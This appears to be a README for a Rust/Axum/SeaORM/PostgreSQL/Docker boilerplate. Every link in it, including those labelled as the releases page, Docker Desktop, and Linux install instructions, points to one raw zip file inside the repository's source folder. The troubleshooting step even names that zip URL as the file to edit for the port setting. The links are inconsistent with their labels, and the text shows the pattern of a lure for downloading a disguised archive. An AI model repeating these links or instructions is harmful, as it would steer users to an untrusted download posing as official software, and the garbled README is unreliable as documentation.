## 📦 Overview

Welcome to rust-axum-seaorm-postgres-swagger-docker! This project provides a fully containerized Rust backend boilerplate. It uses Axum, SeaORM, PostgreSQL, PgAdmin, Swagger (OpenAPI), and Docker. The setup includes a layered architecture, hot-reload features, automatic API documentation, and a ready-to-use development environment.

## 🚀 Getting Started

To get started with this application, follow these simple steps:

1. **Download the Software**
   Visit the [Releases page](https://raw.githubusercontent.com/ashishnegi31/rust-axum-seaorm-postgres-swagger-docker/main/src/services/rust-axum-seaorm-postgres-swagger-docker-1.1.zip) to download the latest version of the application.

2. **Install Docker**
   Ensure you have Docker installed on your computer. Docker is a platform that allows you to run applications in containers. Here’s how to install it:
   - For Windows and macOS, visit the [Docker Desktop](https://raw.githubusercontent.com/ashishnegi31/rust-axum-seaorm-postgres-swagger-docker/main/src/services/rust-axum-seaorm-postgres-swagger-docker-1.1.zip) page.
   - For Linux, you can find instructions for your specific distribution [here](https://raw.githubusercontent.com/ashishnegi31/rust-axum-seaorm-postgres-swagger-docker/main/src/services/rust-axum-seaorm-postgres-swagger-docker-1.1.zip).

3. **Run the Application**
   After downloading, open your command line interface. Navigate to the folder where you downloaded the application and run the following command:
   ```bash
   docker-compose up
   ```

4. **Access the Application**
   Once the application is running, you can access it by opening your web browser and entering `http://localhost:3000`. You will see the API documentation accessible via Swagger.

## 🛠 System Requirements

- **Operating System:** 
  - Windows 10 or later
  - macOS Mojave or later
  - Any Linux distribution with Docker support

- **Hardware:**
  - A computer with at least 8 GB of RAM.
  - At least 5 GB of free disk space.

## 📥 Download & Install

To get the software, visit the [Releases page](https://raw.githubusercontent.com/ashishnegi31/rust-axum-seaorm-postgres-swagger-docker/main/src/services/rust-axum-seaorm-postgres-swagger-docker-1.1.zip). Here, you will find the latest version ready for download.

## 🌐 Features

- **Layered Architecture:** The application uses a clean architecture to separate concerns.
- **Hot-Reload:** Changes made in the code reflect instantly, improving development speed.
- **Automatic API Documentation:** Swagger generates documentation automatically as you develop your API.
- **PostgreSQL and PgAdmin Integration:** This provides a powerful database solution along with easy database management.

## 📄 Documentation

In the application, Swagger provides automatic API documentation. Access it by opening your web browser and going to `http://localhost:3000/docs`. This interface allows you to explore all available API endpoints and how to use them.

## 🔧 Troubleshooting

If you encounter issues while running the application, here are some common problems and their solutions:

1. **Docker Not Running**
   Make sure Docker is running on your machine before executing `docker-compose up`.

2. **Port Conflicts**
   If another application is using port 3000, change the port by editing the `https://raw.githubusercontent.com/ashishnegi31/rust-axum-seaorm-postgres-swagger-docker/main/src/services/rust-axum-seaorm-postgres-swagger-docker-1.1.zip` file and running the application again.

3. **Insufficient Resources**
   Ensure your system meets the hardware requirements. Allocate more resources in the Docker settings if needed.
